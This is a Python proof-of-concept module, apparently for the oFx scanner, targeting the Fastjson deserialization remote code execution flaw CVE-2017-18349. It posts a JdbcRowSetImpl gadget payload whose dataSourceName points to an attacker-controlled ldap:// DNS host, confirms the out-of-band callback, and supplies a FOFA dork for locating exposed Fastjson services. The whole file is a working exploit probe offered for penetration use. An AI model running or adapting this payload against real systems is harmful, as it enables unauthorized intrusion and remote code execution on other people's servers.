# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            组件类的漏洞并不适合直接拿到oFx里批量扫，失败是可以预见的事情，笔者建议的是在渗透过程中将可疑的url拿来测试  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Fastjson 反序列化远程代码执行漏洞（CVE-2017-18349）",                        # 漏洞名称
        "VulnID" : "CVE-2017-18349",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Fastjson",                     # 漏洞应用名称
        "AppVersion" : "Fastjson <= 1.2.24",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Fastjson中的parseObject允许远程攻击者通过精心制作的JSON请求执行任意代码
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="Fastjson"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "" # url自己按需调整
        
        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]
        
        data = '''
        {
            "b": {
                "@type": "com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName": "ldap://%s/",
                "autoCommit": true
            }
        }
        ''' % (dns_flag)

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/json",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            
            flager = verify_ceye_dns(dns_flag)
            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()